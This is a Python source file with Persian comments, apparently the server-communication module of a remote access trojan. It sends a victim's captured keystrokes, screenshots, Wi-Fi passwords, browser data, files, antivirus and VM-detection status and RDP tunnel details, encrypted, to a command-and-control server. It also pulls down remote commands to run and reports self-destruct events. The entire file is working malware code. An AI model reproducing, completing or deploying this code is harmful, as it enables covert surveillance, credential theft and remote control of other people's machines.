import requests
import json
import logging
import time
import datetime  # این خط را اضافه کنید
from typing import Dict, List
from encryption.manager import EncryptionManager
import gzip
import base64
from rat_config import Config

class ServerCommunicator:
    def __init__(self, client_id, encryption_manager):
        self.client_id = client_id
        self.encryption = encryption_manager
        self.server_url = Config.SERVER_URL.rstrip('/')
        self.version_url = Config.UPDATE_URL
        self.token = Config.SECRET_TOKEN
        self.proxies = {
            "http": Config.PROXY_HTTP,
            "https": Config.PROXY_HTTPS
        } if Config.PROXY_HTTP or Config.PROXY_HTTPS else None
        
        # Setup logging for this module
        self.logger = logging.getLogger("ServerCommunicator")

    def _send_request(self, action: str, data: Dict = None, files=None):
        """ارسال درخواست به سرور"""
        if not Config.ENABLE_COMMAND_HANDLER and action != "check_version":
            self.logger.info(f"Command handler disabled, skipping request: {action}")
            return []
    
        try:
            url = self.server_url
            payload = {'action': action}
            
            # مدیریت داده‌ها
            if data:
                if isinstance(data, dict):
                    payload.update(data)
                else:
                    self.logger.warning(f"Data is not a dictionary: {type(data)}")
                    # تبدیل به دیکشنری اگر ممکن است
                    try:
                        if hasattr(data, '__dict__'):
                            payload.update(data.__dict__)
                        else:
                            payload['raw_data'] = str(data)
                    except Exception as e:
                        self.logger.error(f"Failed to process data: {str(e)}")
            
            self.logger.info(f"Sending request to {url} with action={action}, data_keys={list(payload.keys()) if payload else None}, files={files is not None}")
            
            # تنظیم timeout پویا بر اساس نوع action
            timeout = Config.COMMAND_TIMEOUT
            if files or action in ["upload_data", "upload_file", "report_rdp_tunnel"]:
                timeout = 30  # timeout بیشتر برای آپلود فایل‌های حجیم
            
            if files:
                response = requests.post(
                    url,
                    data=payload,
                    files=files,
                    verify=False,
                    timeout=timeout,
                    proxies=self.proxies
                )
            else:
                response = requests.post(
                    url,
                    json=payload,
                    verify=False,
                    timeout=timeout,
                    proxies=self.proxies
                )
            
            return self._handle_response(response)
            
        except requests.exceptions.Timeout:
            error_msg = f"Request timeout for action {action} (timeout: {timeout}s)"
            self.logger.error(error_msg)
            raise CommunicationError(error_msg)
            
        except requests.exceptions.ConnectionError:
            error_msg = f"Connection error for action {action}"
            self.logger.error(error_msg)
            raise CommunicationError(error_msg)
            
        except requests.exceptions.RequestException as e:
            error_msg = f"Request error for action {action}: {str(e)}"
            self.logger.error(error_msg)
            raise CommunicationError(error_msg)
            
        except Exception as e:
            error_msg = f"Unexpected error in _send_request for action {action}: {str(e)}"
            self.logger.error(error_msg)
            raise CommunicationError(error_msg)

    def check_version(self) -> Dict:
        """بررسی نسخه جدید"""
        if not Config.ENABLE_AUTO_UPDATE:
            self.logger.info("Auto-update disabled, skipping version check")
            return {"current_version": Config.CLIENT_VERSION, "message": "Auto-update disabled"}

        try:
            self.logger.info(f"Checking for updates: client_id={self.client_id}")
            data = {
                "action": "check_version",
                "client_id": self.client_id,
                "token": self.token
            }
            
            self.logger.info(f"Sending version check request to {self.version_url}")
            response = requests.post(
                self.version_url,
                json=data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            
            self.logger.info(f"Version check response: status={response.status_code}")
            return response.json()
            
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Version check error: {str(e)}")
            return {"error": f"Version check failed: {str(e)}"}
        except json.JSONDecodeError:
            self.logger.error("Invalid JSON response from version check")
            return {"error": "Invalid JSON response"}

    def report_rdp_tunnel(self, tunnel_info: Dict) -> Dict:
        """گزارش وضعیت RDP"""
        if not Config.ENABLE_RDP_CONTROL:
            self.logger.info("RDP control disabled, skipping tunnel report")
            return {"status": "skipped", "message": "RDP control disabled"}

        try:
            self.logger.info(f"Preparing RDP tunnel report: client_id={self.client_id}")
            tunnel_info_json = json.dumps(tunnel_info, ensure_ascii=False)
            encrypted_tunnel_info = self.encryption.encrypt(tunnel_info_json)
            
            encrypted_data = {
                "action": "report_rdp_tunnel",
                "client_id": self.client_id,
                "token": self.token,
                "tunnel_info": encrypted_tunnel_info
            }
            
            self.logger.info("Sending RDP tunnel report")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            
            self.logger.info("RDP tunnel report sent successfully")
            return response.json()
            
        except Exception as e:
            self.logger.error(f"RDP tunnel report error: {str(e)}")
            raise CommunicationError(f"RDP tunnel report error: {str(e)}")

    def report_update(self, new_version: str) -> Dict:
        """گزارش بروزرسانی"""
        if not Config.ENABLE_AUTO_UPDATE:
            self.logger.info("Auto-update disabled, skipping update report")
            return {"status": "skipped", "message": "Auto-update disabled"}

        try:
            self.logger.info(f"Preparing update report: client_id={self.client_id}, new_version={new_version}")
            report_data = {
                "message": f"Updated to version {new_version}",
                "client_id": self.client_id,
                "new_version": new_version,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
            encrypted_report = self.encryption.encrypt(json.dumps(report_data, ensure_ascii=False))
            encrypted_data = {
                "action": "report_update",
                "client_id": self.client_id,
                "token": self.token,
                "report": encrypted_report
            }
            
            self.logger.info("Sending update report")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            
            self.logger.info("Update report sent successfully")
            return response.json()
            
        except Exception as e:
            self.logger.error(f"Update report error: {str(e)}")
            raise CommunicationError(f"Update report error: {str(e)}")

    def upload_vm_status(self, vm_details: Dict) -> Dict:
        """آپلود وضعیت VM"""
        if not Config.ENABLE_VM_DETECTION:
            self.logger.info("VM detection disabled, skipping status upload")
            return {"status": "skipped", "message": "VM detection disabled"}

        try:
            self.logger.info(f"Preparing VM status upload: client_id={self.client_id}")
            vm_details_json = json.dumps(vm_details, ensure_ascii=False)
            encrypted_vm_details = self.encryption.encrypt(vm_details_json)
            
            encrypted_data = {
                "action": "upload_vm_status",
                "client_id": self.client_id,
                "token": self.token,
                "vm_details": encrypted_vm_details
            }
            
            self.logger.info("Sending VM status")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            
            self.logger.info("VM status upload successful")
            return response.json()
            
        except Exception as e:
            self.logger.error(f"VM status upload error: {str(e)}")
            raise CommunicationError(f"VM status upload error: {str(e)}")

    def upload_antivirus_status(self, antivirus_data: Dict) -> Dict:
        """آپلود وضعیت آنتی‌ویروس"""
        if not Config.ENABLE_ANTIVIRUS_DETECTION:
            self.logger.info("Antivirus detection disabled, skipping status upload")
            return {"status": "skipped", "message": "Antivirus detection disabled"}

        try:
            self.logger.info(f"Antivirus status upload: client_id={self.client_id}")
            antivirus_data_json = json.dumps(antivirus_data, ensure_ascii=False)
            encrypted_antivirus_data = self.encryption.encrypt(antivirus_data_json)
            
            encrypted_data = {
                "action": "upload_antivirus_status",
                "client_id": self.client_id,
                "token": self.token,
                "antivirus_data": encrypted_antivirus_data
            }
            
            self.logger.info("Sending antivirus status")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            
            self.logger.info("Antivirus status upload successful")
            return response.json()
            
        except Exception as e:
            self.logger.error(f"Antivirus status upload error: {str(e)}")
            raise CommunicationError(f"Antivirus status upload error: {str(e)}")

    def report_self_destruct(self) -> Dict:
        """گزارش self-destruct"""
        try:
            self.logger.info(f"Preparing self-destruct report: client_id={self.client_id}")
            report_data = {
                "message": "Self-destruct initiated",
                "client_id": self.client_id,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "reason": "VM detection or critical error"
            }
            
            encrypted_report = self.encryption.encrypt(json.dumps(report_data, ensure_ascii=False))
            encrypted_data = {
                "action": "report_self_destruct",
                "client_id": self.client_id,
                "token": self.token,
                "report": encrypted_report
            }
            
            self.logger.info("Sending self-destruct report")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            
            self.logger.info("Self-destruct report sent successfully")
            return response.json()
            
        except Exception as e:
            self.logger.error(f"Self-destruct report error: {str(e)}")
            return {"error": f"Self-destruct report error: {str(e)}"}

    def _handle_response(self, response):
        """پردازش پاسخ سرور"""
        self.logger.info(f"Received response: status={response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                if not isinstance(data, dict) or 'commands' not in data:
                    self.logger.error("Invalid response format: Missing 'commands' key")
                    raise CommunicationError("Invalid response format: Missing 'commands' key")
                if not isinstance(data['commands'], list):
                    self.logger.error("Invalid commands format: Expected list")
                    raise CommunicationError("Invalid commands format: Expected list")
                return data['commands']
            except json.JSONDecodeError:
                self.logger.error("Invalid JSON response")
                raise CommunicationError("Invalid JSON response")
        else:
            self.logger.error(f"Server error: {response.status_code}")
            raise CommunicationError(f"Server error: {response.status_code}")

    def upload_data(self, keystrokes, system_info, screenshot=None):
        """آپلود داده‌های کیلاگر"""
        if not Config.ENABLE_KEYLOGGING:
            self.logger.info("Keylogging disabled, skipping data upload")
            return {"status": "skipped", "message": "Keylogging disabled"}

        try:
            # اعتبارسنجی و مقداردهی پیش‌فرض مناسب
            if not keystrokes or not isinstance(keystrokes, list):
                self.logger.debug("Keystrokes is empty, using default")
                keystrokes = []

            if not system_info or not isinstance(system_info, dict):
                self.logger.debug("System_info is empty, using default")
                system_info = {'info': 'No system info available'}

            # آماده‌سازی داده‌ها
            keystrokes_str = ' '.join(str(k) for k in keystrokes if k)
            system_info_json = json.dumps(system_info, ensure_ascii=False)
            
            self.logger.info(f"Preparing upload: client_id={self.client_id}, keystrokes_len={len(keystrokes_str)}")
            
            # رمزنگاری
            try:
                encrypted_keystrokes = self.encryption.encrypt(keystrokes_str)
                encrypted_system_info = self.encryption.encrypt(system_info_json)
            except Exception as e:
                self.logger.error(f"Encryption failed: {str(e)}")
                raise CommunicationError(f"Encryption failed: {str(e)}")

            if not encrypted_keystrokes or not encrypted_system_info:
                self.logger.error("Encryption produced empty output")
                raise CommunicationError("Encryption produced empty output")

            # ایجاد درخواست
            encrypted_data = {
                "action": "upload_data",
                "client_id": self.client_id,
                "token": self.token,
                "keystrokes": encrypted_keystrokes,
                "system_info": encrypted_system_info
            }

            files = {}
            if screenshot and Config.ENABLE_SCREENSHOTS:
                files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
                self.logger.info("Including screenshot in upload")

            # ارسال درخواست
            if files:
                response = requests.post(
                    self.server_url,
                    data=encrypted_data,
                    files=files,
                    timeout=Config.COMMAND_TIMEOUT,
                    verify=False,
                    proxies=self.proxies
                )
            else:
                response = requests.post(
                    self.server_url,
                    json=encrypted_data,
                    timeout=Config.COMMAND_TIMEOUT,
                    verify=False,
                    proxies=self.proxies
                )
                
            response.raise_for_status()
            self.logger.info("Upload successful")
            return response.json()
            
        except Exception as e:
            self.logger.error(f"Upload error: {str(e)}")
            raise CommunicationError(f"Upload error: {str(e)}")

    def fetch_commands(self):
        """دریافت دستورات از سرور"""
        if not Config.ENABLE_COMMAND_HANDLER:
            self.logger.info("Command handler disabled, skipping command fetch")
            return []

        try:
            self.logger.info("Fetching commands...")
            response = self._send_request(
                "get_commands",
                data={
                    "client_id": self.client_id,
                    "token": self.token
                }
            )

            validated_commands = []
            for cmd in response:
                if not all(k in cmd for k in ('id', 'command')):
                    self.logger.warning(f"Skipping invalid command: {cmd}")
                    continue
                    
                try:
                    decrypted = self.encryption.decrypt(cmd['command'])
                    self.logger.info(f"Decrypted command: {decrypted}")
                    
                    if decrypted.startswith('/'):
                        command_type = decrypted.strip('/')
                        params = {}
                    else:
                        command_data = json.loads(decrypted)
                        command_type = command_data.get('type')
                        params = command_data.get('params', {})
                    
                    self.logger.info(f"Parsed command data: type={command_type}")
                    
                    if not command_type:
                        self.logger.error(f"Command missing 'type': {decrypted}")
                        continue

                    validated_commands.append({
                        'id': cmd['id'],
                        'command': cmd['command'],
                        'type': command_type,
                        'params': params
                    })
                    
                except Exception as e:
                    self.logger.error(f"Command validation failed: {str(e)}, command={cmd}")

            self.logger.info(f"Validated {len(validated_commands)} commands")
            return validated_commands
            
        except Exception as e:
            self.logger.error(f"Failed to fetch commands: {str(e)}")
            raise CommunicationError(f"Failed to process commands: {str(e)}")

    def upload_wifi_passwords(self, wifi_data: Dict) -> Dict:
        """آپلود پسوردهای WiFi"""
        if not Config.ENABLE_WIFI_PASSWORD_EXTRACTION:
            self.logger.info("WiFi password extraction disabled, skipping upload")
            return {"status": "skipped", "message": "WiFi password extraction disabled"}

        try:
            self.logger.info(f"Preparing Wi-Fi passwords upload: client_id={self.client_id}")
            wifi_data_json = json.dumps(wifi_data, ensure_ascii=False)
            encrypted_wifi_data = self.encryption.encrypt(wifi_data_json)
            
            encrypted_data = {
                "action": "upload_wifi_passwords",
                "client_id": self.client_id,
                "token": self.token,
                "wifi_data": encrypted_wifi_data
            }
            
            self.logger.info("Sending Wi-Fi passwords")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            
            self.logger.info("Wi-Fi passwords upload successful")
            return response.json()
            
        except Exception as e:
            self.logger.error(f"Wi-Fi passwords upload error: {str(e)}")
            raise CommunicationError(f"Wi-Fi passwords upload error: {str(e)}")

    def send_command_result(self, command_id, result):
        """ارسال نتیجه اجرای دستور"""
        if not Config.ENABLE_COMMAND_HANDLER:
            self.logger.info("Command handler disabled, skipping result send")
            return {"status": "skipped", "message": "Command handler disabled"}

        try:
            self.logger.info(f"Sending command result for command_id: {command_id}")
            
            # فشرده‌سازی و رمزنگاری نتیجه
            compressed_result = gzip.compress(json.dumps(result).encode())
            encrypted_result = self.encryption.encrypt(base64.b64encode(compressed_result).decode())
            
            data = {
                'action': 'command_response',
                'client_id': self.client_id,
                'command_id': str(command_id),
                'result': encrypted_result,
                'token': self.token
            }
            
            response = requests.post(
                self.server_url,
                json=data,
                headers={'Content-Type': 'application/json'},
                verify=False,
                timeout=Config.COMMAND_TIMEOUT,
                proxies=self.proxies
            )
            response.raise_for_status()
            
            self.logger.info(f"Command result sent successfully: {response.status_code}")
            return response.json()
            
        except Exception as e:
            self.logger.error(f"Failed to send command result: {str(e)}")
            raise CommunicationError(f"Failed to send command result: {str(e)}")

    def upload_browser_data_comprehensive(self, browser_data: Dict) -> Dict:
        """آپلود اطلاعات کامل مرورگر"""
        if not Config.ENABLE_BROWSER_DATA_COLLECTION:
            self.logger.info("Browser data collection disabled, skipping upload")
            return {"status": "skipped", "message": "Browser data collection disabled"}
    
        try:
            self.logger.info(f"Preparing comprehensive browser data upload: client_id={self.client_id}")
            
            browser_data_json = json.dumps(browser_data, ensure_ascii=False)
            encrypted_browser_data = self.encryption.encrypt(browser_data_json)
            
            encrypted_data = {
                "action": "upload_browser_data_comprehensive",
                "client_id": self.client_id,
                "token": self.token,
                "browser_data": encrypted_browser_data,
                "timestamp": datetime.now().isoformat()
            }
            
            self.logger.info("Sending comprehensive browser data")
            response = requests.post(
                self.server_url,
                json=encrypted_data,
                timeout=60,  # timeout بیشتر برای داده‌های حجیم
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            
            self.logger.info("Comprehensive browser data upload successful")
            return response.json()
            
        except Exception as e:
            self.logger.error(f"Comprehensive browser data upload error: {str(e)}")
            raise CommunicationError(f"Comprehensive browser data upload error: {str(e)}")

    def upload_file(self, file_data: Dict) -> Dict:
        """آپلود فایل"""
        if not Config.ENABLE_FILE_MANAGEMENT:
            self.logger.info("File management disabled, skipping file upload")
            return {"status": "skipped", "message": "File management disabled"}

        try:
            self.logger.info(f"Preparing file upload: client_id={self.client_id}, filename={file_data['filename']}")
            
            files = {
                "file": (file_data["filename"], file_data["content"], "application/octet-stream")
            }
            data = {
                "action": "upload_file",
                "client_id": file_data["client_id"],
                "token": self.token,
                "timestamp": file_data["timestamp"]
            }
            
            self.logger.info("Sending file upload request")
            response = requests.post(
                self.server_url,
                data=data,
                files=files,
                timeout=Config.COMMAND_TIMEOUT,
                verify=False,
                proxies=self.proxies
            )
            response.raise_for_status()
            
            self.logger.info(f"File uploaded successfully: {file_data['filename']}")
            return response.json()
            
        except Exception as e:
            self.logger.error(f"File upload error: {str(e)}")
            raise CommunicationError(f"File upload error: {str(e)}")

    def get_communication_status(self):
        """دریافت وضعیت ارتباط"""
        return {
            "server_url": self.server_url,
            "client_id": self.client_id,
            "command_handler_enabled": Config.ENABLE_COMMAND_HANDLER,
            "auto_update_enabled": Config.ENABLE_AUTO_UPDATE,
            "keylogging_enabled": Config.ENABLE_KEYLOGGING,
            "proxies_configured": self.proxies is not None
        }

class CommunicationError(Exception):
    """خطای ارتباط با سرور"""
    pass